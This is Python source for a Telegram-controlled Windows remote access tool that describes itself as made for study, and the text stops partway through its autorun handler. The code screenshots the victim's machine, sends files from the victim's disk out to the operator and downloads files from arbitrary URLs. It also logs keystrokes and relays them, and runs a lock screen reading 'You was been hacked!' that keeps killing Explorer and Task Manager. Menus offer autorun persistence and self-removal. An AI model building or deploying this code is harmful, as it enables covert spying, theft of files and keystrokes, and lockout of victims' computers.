# The bot was created for the purpose of studying

import telebot
import pyautogui as pg
import webbrowser
from time import sleep
from telebot import types
import os
import psutil
import random
import ctypes
import getpass
import platform
import wget
from threading import Thread
from winreg import *
from prettytable import PrettyTable
import sys
from pynput import keyboard
from threading import Timer
import tkinter as tk
from tkinter import messagebox as mb
from win32api import GetSystemMetrics
import winreg

id_a = 1111  # User Id who will use the bot
bot_token = ''    # Bot Token which will be used

welcome_table = PrettyTable()
welcome_table.field_names = ["Title", "Description"]
welcome_table.add_row(["/sys", "Serves to control the system"])
welcome_table.add_row(["/file", "Serves to work with files"])
welcome_table.add_row(["/tools", "Serves to open tools menu"])
welcome_table.add_row(["/keylog", "Serves to open the click capture menu"])
welcome_table.add_row(["/winlock", "Serves to lock windows"])
welcome_table.add_row(["/auto", "Serves for autorun of the application"])
welcome_table.add_row(["/kill", "Serves for self-removal of the application"])

bot = telebot.TeleBot(bot_token)

global Turn_access
Turn_access = False

global Turn_sys
Turn_sys = False

global Turn_file
Turn_file = False

global Turn_tools
Turn_tools = False

global Turn_keylog
Turn_keylog = False

global Turn_winlock
Turn_winlock = False

global Turn_auto_start
Turn_auto_start = False

global Turn_kill
Turn_kill = False

log = ""
password = random.randint(1000, 10000)


# main
def check_id(message):
    sleep(0.2)

    try:

        global sender
        sender = message.from_user.id
        if sender == id_a:

            global Turn_access
            Turn_access = True

        else:
            bot.send_message(message.chat.id, "Forbidden access!")
            bot.stop_polling()
            sleep(1)
            sys.exit()

    except Exception as e:
        bot.reply_to(message, e)


def send_welcome_message(message):
    check_id(message)

    sleep(0.2)
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("/sys")
    btn2 = types.KeyboardButton("/file")
    btn3 = types.KeyboardButton("/tools")
    btn4 = types.KeyboardButton("/keylog")
    btn5 = types.KeyboardButton("/winlock")
    btn6 = types.KeyboardButton("/auto")
    btn7 = types.KeyboardButton("/kill")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)

    bot.send_message(message.chat.id, "<pre>" + str(welcome_table) + "</pre>", parse_mode="HTML", reply_markup=markup)


# sys
def back_sys(message):
    check_id(message)
    sleep(0.5)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Output text")
    btn2 = types.KeyboardButton("Open the browser page")
    btn3 = types.KeyboardButton("Take a screenshot")
    btn4 = types.KeyboardButton("Turn off the computer")
    btn5 = types.KeyboardButton("Change the desktop wallpaper")
    btn6 = types.KeyboardButton("Find out information about the system")
    btn7 = types.KeyboardButton("Back")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    bot.send_message(message.chat.id, "Select function: ".format(message.from_user), reply_markup=markup)


def sys_text(message):
    check_id(message)

    if message.text == "Back":
        back_sys(message)

    else:
        try:
            answer = pg.alert(message.text, "~")
        except Exception as e:
            bot.reply_to(message, e)

        back_sys(message)


def sys_browser(message):
    check_id(message)

    if message.text == "Back":
        back_sys(message)

    else:
        try:
            path = "https://"
            try:
                webbrowser.open(path + message.text)
            except Exception as e:
                bot.send_message()

        except Exception as e:
            bot.reply_to(message, e)

        back_sys(message)


def sys_screenshot(message):
    check_id(message)

    if message.text == "Back":
        back_sys(message)

    else:
        msg = message.text
        result = msg.split(" | ")

        try:

            for i in range(int(result[0])):
                pg.screenshot(str(i) + ".jpg")
                sleep(int(result[1]))

                with open(str(i) + ".jpg", "rb") as img:
                    bot.send_photo(message.chat.id, img)

                os.remove(str(i) + ".jpg")
        except Exception as e:
            bot.reply_to(message, e)

        sleep(0.5)
        back_sys(message)


def sys_shutdown(message):
    check_id(message)

    if message.text == "Back":
        back_sys(message)

    if message.text == "Shutdown":

        try:
            os.system("shutdown /s /t 0")
            bot.send_message(message.chat.id, "Successfully!")

        except Exception as e:
            bot.reply_to(message, e)

    if message.text == "Reboot":

        try:
            os.system("shutdown /r /t 0")
            bot.send_message(message.chat.id, "Successfully!")
        except Exception as e:
            bot.reply_to(message, e)


def sys_background(message):
    check_id(message)

    if message.text == "Back":
        back_sys(message)

    else:

        try:

            global chat_id, file_info, downloaded_file
            chat_id = message.chat.id

            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            global name
            name = random.randint(1, 100000)

            src = 'foto ' + str(name) + message.document.file_name;
            with open(src, 'wb') as new_file:
                new_file.write(downloaded_file)

            cwd = os.getcwd()

            foto_path = "\\foto " + str(name) + message.document.file_name;
            full_path = cwd + foto_path

            ctypes.windll.user32.SystemParametersInfoW(20, 0, full_path, 0)

            bot.send_message(message.chat.id, "Successfully!")
            sleep(0.2)
            back_sys(message)

            sleep(2)

            os.remove(full_path)

        except Exception as e:
            bot.reply_to(message, e)


def sys_info(message):
    check_id(message)

    if message.text == "Back":
        back_sys(message)

    try:

        if message.text == "Windows version":
            sys = platform.system() + ' ' + platform.release()
            bot.send_message(message.chat.id, sys)
            back_sys(message)

        if message.text == "Username":
            username = getpass.getuser()
            bot.send_message(message.chat.id, username)
            back_sys(message)

        if message.text == "Processor name":
            aReg = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
            aKey = OpenKey(aReg, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0")
            name = QueryValueEx(aKey, 'ProcessorNameString')[0]
            bot.send_message(message.chat.id, name)
            back_sys(message)

    except Exception as e:
        bot.reply_to(message, e)


# file
def back_file(message):
    check_id(message)
    sleep(0.5)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton("Open file")
    btn2 = types.KeyboardButton("Viewing folders")
    btn3 = types.KeyboardButton("Downloading files from the system")
    btn4 = types.KeyboardButton("Downloading files to the system")
    btn5 = types.KeyboardButton("Back")
    markup.add(btn1, btn2, btn3, btn4, btn5)
    bot.send_message(message.chat.id, "Select function: ".format(message.from_user), reply_markup=markup)


def file_open(message):
    check_id(message)

    if message.text == "Back":
        back_file(message)

    else:

        try:
            path = message.text
            os.startfile(path)

        except Exception as e:
            bot.reply_to(message, e)

        back_file(message)


def file_folder(message):
    check_id(message)

    if message.text == "Back":
        back_file(message)

    else:

        try:
            path = message.text

            inside_folders = None
            inside_files = None

            for dirs, folder, files in os.walk(path):
                inside_folders = folder
                inside_files = files
                break

            inside_files_simple = "\n".join(inside_files)
            inside_folders_simple = "\n".join(inside_folders)

            bot.send_message(message.chat.id, "<b>Files</b>\n" + inside_files_simple, parse_mode="HTML")
            bot.send_message(message.chat.id, "<b>Folders</b>\n" + inside_folders_simple, parse_mode="HTML")



        except Exception as e:
            bot.reply_to(message, e)

        back_file(message)


def file_download_sys(message):
    check_id(message)

    if message.text == "Back":
        back_file(message)

    else:

        try:
            path = message.text

            with open(path, "rb") as misc:
                file = misc.read()

            bot.send_document(message.chat.id, file)

        except Exception as e:
            bot.reply_to(message, e)

        back_file(message)


def file_download_int(message):
    check_id(message)

    if message.text == "Back":
        back_file(message)

    else:
        try:
            username = getpass.getuser()
            url = message.text
            wget.download(url, "C:\\Users\\" + username + "\\Downloads\\")

        except Exception as e:
            bot.reply_to(message, e)

        bot.send_message(message.chat.id, "Successfully!")
        back_file(message)


# tools
def tools_back(message):
    check_id(message)
    sleep(0.5)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Delete a process by name")
    btn2 = types.KeyboardButton("Buttons/text printing")
    btn3 = types.KeyboardButton("Creating folders/files")
    btn4 = types.KeyboardButton("Back")
    markup.add(btn1, btn2, btn3, btn4)
    bot.send_message(message.chat.id, "Select function: ".format(message.from_user), reply_markup=markup)


def tools_button_back(message):
    check_id(message)
    sleep(0.5)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Minimize all windows")
    btn2 = types.KeyboardButton("Close all windows")
    btn3 = types.KeyboardButton("Open explorer")
    btn4 = types.KeyboardButton("Back")
    markup.add(btn1, btn2, btn3, btn4)
    sleep(0.5)
    msg = bot.send_message(message.chat.id, 'Select button:', reply_markup=markup)
    bot.register_next_step_handler(msg, tools_button_menu)


def tools_text_back(message):
    check_id(message)
    sleep(0.5)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Buttons")
    btn2 = types.KeyboardButton("Text printing")
    btn3 = types.KeyboardButton("Back")
    markup.add(btn1, btn2, btn3)

    msg = bot.send_message(message.chat.id, 'Select function:', reply_markup=markup)
    bot.register_next_step_handler(msg, tools_button)


def tools_create_back(message):
    check_id(message)
    sleep(0.5)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Delete a process by name")
    btn2 = types.KeyboardButton("Buttons/text printing")
    btn3 = types.KeyboardButton("Creating folders/files")
    btn4 = types.KeyboardButton("Back")
    markup.add(btn1, btn2, btn3, btn4)
    bot.send_message(message.chat.id, "Select function: ".format(message.from_user), reply_markup=markup)


def tools_create_back_menu(message):
    check_id(message)
    sleep(0.5)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Create folders")
    btn2 = types.KeyboardButton("Create files")
    btn3 = types.KeyboardButton("Back")
    markup.add(btn1, btn2, btn3)

    msg = bot.send_message(message.chat.id, 'Select function:', reply_markup=markup)
    bot.register_next_step_handler(msg, tools_create)


def tools_task(message):
    check_id(message)

    if message.text == "Back":
        tools_back(message)

    else:

        try:

            PROCNAME = message.text + ".exe"

            for proc in psutil.process_iter():
                if proc.name() == PROCNAME:
                    proc.kill()

        except Exception as e:
            bot.reply_to(message, e)

        else:
            bot.send_message(message.chat.id, "Successfully!")
            tools_back(message)


def tools_button(message):
    check_id(message)

    if message.text == "Back":
        tools_back(message)

    if message.text == "Buttons":
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Minimize all windows")
        btn2 = types.KeyboardButton("Close all windows")
        btn3 = types.KeyboardButton("Open explorer")
        btn4 = types.KeyboardButton("Back")
        markup.add(btn1, btn2, btn3, btn4)
        sleep(0.5)

        msg = bot.send_message(message.chat.id, 'Select button: ', reply_markup=markup)
        bot.register_next_step_handler(msg, tools_button_menu)

    if message.text == "Text printing":
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Back")
        markup.add(btn1)

        msg = bot.send_message(message.chat.id, 'Enter the text: ', reply_markup=markup)
        bot.register_next_step_handler(msg, tools_text_menu)


def tools_button_menu(message):
    check_id(message)

    if message.text == "Back":
        tools_text_back(message)

    if message.text == "Minimize all windows":
        sleep(0.5)
        pg.hotkey("win", "m")
        tools_button_back(message)

    if message.text == "Close all windows":
        sleep(0.5)
        pg.hotkey("alt", "f4")
        tools_button_back(message)

    if message.text == "Open explorer":
        sleep(0.5)
        pg.hotkey("win", "e")
        tools_button_back(message)


def tools_text_menu(message):
    check_id(message)

    if message.text == "Back":

        tools_text_back(message)

    else:

        pg.typewrite(message.text, interval=0.2)
        tools_text_back(message)


def tools_create(message):
    check_id(message)

    if message.text == "Back":
        tools_create_back(message)

    if message.text == "Create folders":
        username = getpass.getuser()
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Back")
        markup.add(btn1)

        msg = bot.send_message(message.chat.id, 'Specify an absolute path | number of folders | name (if needed): ',
                               reply_markup=markup)
        sleep(0.5)
        bot.send_message(message.chat.id, "Exsample: C:\\Users\\" + username + "\\Downloads\\ | 5")
        bot.register_next_step_handler(msg, tools_create_folders)

    if message.text == "Create files":
        username = getpass.getuser()
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Back")
        markup.add(btn1)

        msg = bot.send_message(message.chat.id,
                               'Specify an absolute path | number of files | content | expansion | name (if needed): ',
                               reply_markup=markup)
        sleep(0.5)
        bot.send_message(message.chat.id, "Exsample: C:\\Users\\" + username + "\\Downloads\\ | 5 | hello | txt")
        bot.register_next_step_handler(msg, tools_create_files)


def tools_create_folders(message):
    check_id(message)

    if message.text == "Back":
        tools_create_back_menu(message)


    else:

        try:

            msg = message.text
            result = msg.split(" | ")
            result_check = len(result)

            path = result[0]
            element = "\\"

            check_path = path.endswith(element)
            if not check_path:
                path += "\\"

            if result_check == 3:
                name = result[2]

            else:
                name = random.randint(1, 100000000)

            count = int(result[1])

            for i in range(count):
                os.mkdir(path + str(name) + str(i))
                i = i + 1

        except Exception as e:
            bot.send_message(message.chat.id, "Something went wrong!")
            bot.reply_to(message, e)

        else:
            bot.send_message(message.chat.id, "Successfully!")

        sleep(0.2)
        tools_create_back_menu(message)


def tools_create_files(message):
    check_id(message)

    if message.text == "Back":
        tools_create_back_menu(message)

    else:

        try:

            msg = message.text
            result = msg.split(" | ")
            result_check = len(result)

            path = result[0]
            element_path = "\\"

            check_path = path.endswith(element_path)
            if check_path == False:
                path += "\\"

            count = int(result[1])
            content = result[2]

            expansion = result[3]
            element_expansion = "."

            check_expansion = expansion.startswith(element_expansion)
            if check_expansion == False:
                expansion = element_expansion + expansion

            if result_check == 5:
                name = result[4]

            else:
                name = random.randint(1, 100000000)

            for i in range(count):
                file = open(path + str(name) + str(i) + expansion, "w+")
                i = i + 1
                file.write(content)
                file.close()

        except Exception as e:
            bot.send_message(message.chat.id, "Something went wrong!")
            bot.reply_to(message, e)

        else:
            bot.send_message(message.chat.id, "Successfully!")

        sleep(0.2)
        tools_create_back_menu(message)


# keylog
def keylog_capture(key):
    global log
    key = str(key)

    if len(key) == 3:
        key = key[1]

    elif key == "Key.space":
        key = " "

    else:
        key = f' {key[4:]} '
    log += str(key)


# winlock
def winlock_back(message):
    check_id(message)
    sleep(0.5)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Start")
    btn2 = types.KeyboardButton("Show password")
    btn3 = types.KeyboardButton("Back")
    markup.add(btn1, btn2, btn3)
    bot.send_message(message.chat.id, "Select function: ".format(message.from_user), reply_markup=markup)


def winlock_window(message):
    check_id(message)

    if message.text == "Back":
        winlock_back(message)

    if message.text == "Yes":

        global stop
        stop = False

        def exit_fake():
            pass

        def exit():

            global stop
            stop = True

        def start_kill_explorer():
            t1.start()

        def start_kill_taskmanager():
            t2.start()

        def kill_explorer():

            while not stop:
                proc_name = "explorer.exe"
                for proc in psutil.process_iter():
                    if proc.name() == proc_name:
                        proc.kill()

            os.startfile("C:\\Windows\\explorer.exe")

        def kill_taskmanager():

            proc_name = "Taskmgr.exe"

            while not stop:
                for proc in psutil.process_iter():
                    if proc.name() == proc_name:
                        proc.kill()

                sleep(1)

        def add_digit(digit):
            kank["state"] = tk.NORMAL
            kank.insert("end", digit)
            kank["state"] = tk.DISABLED

        def add_operation(operation):
            value = kank.get()
            try:
                if value[-1] in "-+/*":
                    value = value[:-1]

                kank["state"] = tk.NORMAL
                kank.delete("0", "end")
                kank.insert("0", value + operation)
                kank["state"] = tk.DISABLED
            except:
                mb.showwarning(title="Warning!", message="Input digits, not only operation")

        def clear():
            kank["state"] = tk.NORMAL
            kank.delete("0", "end")
            kank["state"] = tk.DISABLED

        def check():
            try:
                value = kank.get()
                if value == str(password):
                    exit()
                    sleep(0.1)
                    win.destroy()

                else:
                    mb.showerror("Error", "Password is wrong!")
            except:
                pass

        # Windows specs
        Width = GetSystemMetrics(0)
        Height = GetSystemMetrics(1)

        Width1 = Width / 2 - 100
        WidthMon = round(Width1)

        Height1 = Height / 2 - 100
        HeightMon = round(Height1)

        # main
        win = tk.Tk()
        win.geometry(f"400x450+" + str(WidthMon) + "+" + str(HeightMon))
        win.title("M4w1")
        win.resizable(width=False, height=False)
        win["bg"] = "black"
        win.attributes('-toolwindow', True)

        kank = tk.Entry(win, width=30, font="Arial 18")
        kank["state"] = tk.DISABLED

        label = tk.Label(win, text="You was been hacked!", font=("Arial 20"), fg="red", bg="black")
        label1 = tk.Label(win, text="Enter a password:", font=("Arial 20"), fg="red", bg="black")

        butn1 = tk.Button(win, text="1", font=("Arial 20"), bd=5, command=lambda: add_digit(1), bg="#a9adad",
                          activebackground="#999999")
        butn2 = tk.Button(win, text="2", font=("Arial 20"), bd=5, command=lambda: add_digit(2), bg="#a9adad",
                          activebackground="#999999")
        butn3 = tk.Button(win, text="3", font=("Arial 20"), bd=5, command=lambda: add_digit(3), bg="#a9adad",
                          activebackground="#999999")
        butn4 = tk.Button(win, text="4", font=("Arial 20"), bd=5, command=lambda: add_digit(4), bg="#a9adad",
                          activebackground="#999999")
        butn5 = tk.Button(win, text="5", font=("Arial 20"), bd=5, command=lambda: add_digit(5), bg="#a9adad",
                          activebackground="#999999")
        butn6 = tk.Button(win, text="6", font=("Arial 20"), bd=5, command=lambda: add_digit(6), bg="#a9adad",
                          activebackground="#999999")
        butn7 = tk.Button(win, text="7", font=("Arial 20"), bd=5, command=lambda: add_digit(7), bg="#a9adad",
                          activebackground="#999999")
        butn8 = tk.Button(win, text="8", font=("Arial 20"), bd=5, command=lambda: add_digit(8), bg="#a9adad",
                          activebackground="#999999")
        butn9 = tk.Button(win, text="9", font=("Arial 20"), bd=5, command=lambda: add_digit(9), bg="#a9adad",
                          activebackground="#999999")
        butn0 = tk.Button(win, text="0", font=("Arial 20"), bd=5, command=lambda: add_digit(0), bg="#a9adad",
                          activebackground="#999999")
        butnclear = tk.Button(win, text="clear", font=("Arial 20"), bd=5, bg="#c70404", activebackground="#a80000",
                              command=clear)
        butncheck = tk.Button(win, text="check", font=("Arial 20"), bd=5, bg="green", activebackground="#003400",
                              command=check)

        # widgets pack
        label.grid(row=0, column=0, columnspan=3, pady=10, padx=5)
        label1.grid(row=1, column=0, columnspan=3, pady=10, padx=5)
        kank.grid(row=2, column=0, columnspan=3, pady=10, padx=5)
        butn1.grid(row=3, column=0, stick="wens", padx=5, pady=5)
        butn2.grid(row=3, column=1, stick="wens", padx=5, pady=5)
        butn3.grid(row=3, column=2, stick="wens", padx=5, pady=5)
        butn4.grid(row=4, column=0, stick="wens", padx=5, pady=5)
        butn5.grid(row=4, column=1, stick="wens", padx=5, pady=5)
        butn6.grid(row=4, column=2, stick="wens", padx=5, pady=5)
        butn7.grid(row=5, column=0, stick="wens", padx=5, pady=5)
        butn8.grid(row=5, column=1, stick="wens", padx=5, pady=5)
        butn9.grid(row=5, column=2, stick="wens", padx=5, pady=5)
        butn0.grid(row=6, column=0, stick="wens", padx=5, pady=5)
        butnclear.grid(row=6, column=1, stick="wens", padx=5, pady=5)
        butncheck.grid(row=6, column=2, stick="wens", padx=5, pady=5)

        t1 = Thread(target=kill_explorer)
        t2 = Thread(target=kill_taskmanager)

        # mainDef
        win.after(1000, start_kill_explorer)
        win.after(1000, start_kill_taskmanager)

        # exit
        win.protocol("WM_DELETE_WINDOW", exit_fake)
        win.mainloop()


def winlock_show(message):
    check_id(message)

    if message.text == "Back":
        winlock_back(message)

    if message.text == "Yes":
        pg.alert("Your password is\n\n" + str(password), "M4w1")
        winlock_back(message)


@bot.message_handler(commands=["start"])
def handle(message):
    global sender
    sender = message.from_user.id
    if sender == id_a:

        username = getpass.getuser()

        global Turn_access
        Turn_access = True

        bot.send_message(message.chat.id, 'Access is allowed!')
        sleep(0.5)
        bot.send_message(message.chat.id, "MADED BY <b>alexop89056</b>", parse_mode="HTML")
        sleep(1)
        send_welcome_message(message)

    else:
        bot.send_message(message.chat.id, 'Forbidden access!')
        bot.stop_polling()


@bot.message_handler(commands=["sys"], func=lambda check: Turn_access == True)
def send_text(message):
    bot.send_message(message.chat.id, "Run the sys function...")
    sleep(1)
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Output text")
    btn2 = types.KeyboardButton("Open the browser page")
    btn3 = types.KeyboardButton("Take a screenshot")
    btn4 = types.KeyboardButton("Turn off the computer")
    btn5 = types.KeyboardButton("Change the desktop wallpaper")
    btn6 = types.KeyboardButton("Find out information about the system")
    btn7 = types.KeyboardButton("Back")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    bot.send_message(message.chat.id, "Select function: ".format(message.from_user), reply_markup=markup)

    global Turn_sys
    Turn_sys = True


@bot.message_handler(content_types=['text'], func=lambda check: Turn_sys == True)
def send_text_tx(message):
    if message.text == "Back":
        global Turn_sys
        Turn_sys = False

        send_welcome_message(message)

    if message.text == "Output text":
        check_id(message)

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Back")
        markup.add(btn1)

        msg = bot.send_message(message.chat.id, 'Enter the text:', reply_markup=markup)
        bot.register_next_step_handler(msg, sys_text)

    if message.text == "Open the browser page":
        check_id(message)

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Back")
        markup.add(btn1)

        msg = bot.send_message(message.chat.id, 'Enter the Page Url:', reply_markup=markup)
        bot.register_next_step_handler(msg, sys_browser)

    if message.text == "Take a screenshot":
        check_id(message)

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Back")
        markup.add(btn1)

        msg = bot.send_message(message.chat.id,
                               'Specify the number of screenshots | the number of seconds between them:',
                               reply_markup=markup)
        bot.register_next_step_handler(msg, sys_screenshot)

    if message.text == "Turn off the computer":
        check_id(message)

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Shutdown")
        btn2 = types.KeyboardButton("Reboot")
        btn3 = types.KeyboardButton("Back")
        markup.add(btn1, btn2, btn3)

        msg = bot.send_message(message.chat.id, 'Select function:', reply_markup=markup)
        bot.register_next_step_handler(msg, sys_shutdown)

    if message.text == "Change the desktop wallpaper":
        check_id(message)

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Back")
        markup.add(btn1)

        msg = bot.send_message(message.chat.id, 'Send the wallpaper you want to put:', reply_markup=markup)
        bot.register_next_step_handler(msg, sys_background)

    if message.text == "Find out information about the system":
        check_id(message)

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Windows version")
        btn2 = types.KeyboardButton("Username")
        btn3 = types.KeyboardButton("Processor name")
        btn4 = types.KeyboardButton("Back")
        markup.add(btn1, btn2, btn3, btn4)

        msg = bot.send_message(message.chat.id, 'Select function:', reply_markup=markup)
        bot.register_next_step_handler(msg, sys_info)


@bot.message_handler(commands=["file"], func=lambda check: Turn_access == True)
def send_text(message):
    bot.send_message(message.chat.id, "Run the file function...")
    sleep(1)
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton("Open file")
    btn2 = types.KeyboardButton("Viewing folders")
    btn3 = types.KeyboardButton("Downloading files from the system")
    btn4 = types.KeyboardButton("Downloading files to the system")
    btn5 = types.KeyboardButton("Back")
    markup.add(btn1, btn2, btn3, btn4, btn5)
    bot.send_message(message.chat.id, "Select function: ".format(message.from_user), reply_markup=markup)

    global Turn_file
    Turn_file = True


@bot.message_handler(content_types=['text'], func=lambda check: Turn_file == True)
def send_text_tx(message):
    if message.text == "Back":
        global Turn_file
        Turn_file = False

        send_welcome_message(message)

    if message.text == "Open file":
        check_id(message)

        username = getpass.getuser()
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Back")
        markup.add(btn1)

        msg = bot.send_message(message.chat.id, 'Specify the absolute path of the file:', reply_markup=markup)
        bot.register_next_step_handler(msg, file_open)
        bot.send_message(message.chat.id,
                         "Username: <b>" + username + "</b>, example of a path: \nC:\\Users\\" + username + "\\Downloads\\exsample.png",
                         parse_mode="HTML")

    if message.text == "Viewing folders":
        check_id(message)

        username = getpass.getuser()
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Back")
        markup.add(btn1)

        msg = bot.send_message(message.chat.id, 'Specify the absolute path of the folder:', reply_markup=markup)
        bot.register_next_step_handler(msg, file_folder)
        bot.send_message(message.chat.id,
                         "Username: <b>" + username + "</b>, example of a path: \nC:\\Users\\" + username + "\\Downloads",
                         parse_mode="HTML")

    if message.text == "Downloading files from the system":
        check_id(message)

        username = getpass.getuser()
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Back")
        markup.add(btn1)

        msg = bot.send_message(message.chat.id, 'Specify the absolute path of the file:', reply_markup=markup)
        bot.register_next_step_handler(msg, file_download_sys)
        bot.send_message(message.chat.id,
                         "Username: <b>" + username + "</b>, example of a path: \nC:\\Users\\" + username + "\\Downloads\\exsample.png",
                         parse_mode="HTML")

    if message.text == "Downloading files to the system":
        check_id(message)

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Back")
        markup.add(btn1)

        msg = bot.send_message(message.chat.id, 'Specify the URL of the file:', reply_markup=markup)
        bot.register_next_step_handler(msg, file_download_int)


@bot.message_handler(commands=["tools"], func=lambda check: Turn_access == True)
def handle(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Delete a process by name")
    btn2 = types.KeyboardButton("Buttons/text printing")
    btn3 = types.KeyboardButton("Creating folders/files")
    btn4 = types.KeyboardButton("Back")
    markup.add(btn1, btn2, btn3, btn4)
    bot.send_message(message.chat.id, "Select function: ".format(message.from_user), reply_markup=markup)

    global Turn_tools
    Turn_tools = True


@bot.message_handler(content_types=['text'], func=lambda check: Turn_tools == True)
def send_text_tx(message):
    if message.text == "Back":
        global Turn_tools
        Turn_tools = False

        send_welcome_message(message)

    if message.text == "Delete a process by name":
        check_id(message)

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Back")
        markup.add(btn1)

        msg = bot.send_message(message.chat.id, 'Enter the process name:', reply_markup=markup)
        bot.register_next_step_handler(msg, tools_task)

    if message.text == "Buttons/text printing":
        check_id(message)

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Buttons")
        btn2 = types.KeyboardButton("Text printing")
        btn3 = types.KeyboardButton("Back")
        markup.add(btn1, btn2, btn3)

        msg = bot.send_message(message.chat.id, 'Select function:', reply_markup=markup)
        bot.register_next_step_handler(msg, tools_button)

    if message.text == "Creating folders/files":
        check_id(message)

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Create folders")
        btn2 = types.KeyboardButton("Create files")
        btn3 = types.KeyboardButton("Back")
        markup.add(btn1, btn2, btn3)

        msg = bot.send_message(message.chat.id, 'Select function:', reply_markup=markup)
        bot.register_next_step_handler(msg, tools_create)


@bot.message_handler(commands=["keylog"], func=lambda check: Turn_access == True)
def handle(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Back")
    markup.add(btn1)
    bot.send_message(message.chat.id, "Specify the operating time in seconds: ".format(message.from_user),
                     reply_markup=markup)

    global Turn_keylog
    Turn_keylog = True


@bot.message_handler(content_types=['text'], func=lambda check: Turn_keylog == True)
def send_text_tx(message):
    if message.text == "Back":

        global Turn_keylog
        Turn_keylog = False

        send_welcome_message(message)

    else:
        global log
        bot.send_message(message.chat.id, "Expect it!")
        check_id(message)
        try:

            keyboard_listener = keyboard.Listener(on_press=keylog_capture)

            with keyboard_listener as Listener:
                Timer(int(message.text), Listener.stop).start()
                Listener.join()

        except Exception as e:
            bot.reply_to(message, e)

        else:
            bot.send_message(message.chat.id, "In <b>" + str(message.text) + "</b> seconds it was entered:\n " + log,
                             parse_mode="HTML")
            log = ""

            sleep(0.5)


@bot.message_handler(commands=["winlock"], func=lambda check: Turn_access == True)
def send_text(message):
    bot.send_message(message.chat.id, "Run the winlock function...")
    sleep(1)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Start")
    btn2 = types.KeyboardButton("Show password")
    btn3 = types.KeyboardButton("Back")
    markup.add(btn1, btn2, btn3)
    bot.send_message(message.chat.id, "Select function: ".format(message.from_user), reply_markup=markup)
    sleep(0.5)

    global Turn_winlock
    Turn_winlock = True


@bot.message_handler(content_types=['text'], func=lambda check: Turn_winlock == True)
def send_text_tx(message):
    if message.text == "Back":
        global Turn_winlock
        Turn_winlock = False

        send_welcome_message(message)

    if message.text == "Start":
        check_id(message)

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Yes")
        btn2 = types.KeyboardButton("Back")
        markup.add(btn1, btn2)

        msg = bot.send_message(message.chat.id, 'Are you sure?', reply_markup=markup)
        bot.register_next_step_handler(msg, winlock_window)

    if message.text == "Show password":
        check_id(message)

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Yes")
        btn2 = types.KeyboardButton("Back")
        markup.add(btn1, btn2)

        msg = bot.send_message(message.chat.id, 'Are you sure?', reply_markup=markup)
        bot.register_next_step_handler(msg, winlock_show)


@bot.message_handler(commands=["auto"], func=lambda check: Turn_access == True)
def send_text(message):
    bot.send_message(message.chat.id, "Run the autostart function...")
    sleep(1)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Yes")
    btn2 = types.KeyboardButton("Back")
    markup.add(btn1, btn2)
    bot.send_message(message.chat.id, "Are you sure? ".format(message.from_user), reply_markup=markup)
    sleep(0.5)

    global Turn_auto_start
    Turn_auto_start = True


@bot.message_handler(content_types=['text'], func=lambda check: Turn_auto_start == True)
def send_text(message):
    if message.text == "Back":
        global Turn_auto_start
        Turn_auto_start = False

        send_welcome_message(message)

    if message.text == "Yes":
        check_id(message)

        path = sys.argv[0]
        name_file = path.split(sep='\\', maxsplit=50)[-1]

        username = getpass.getuser()
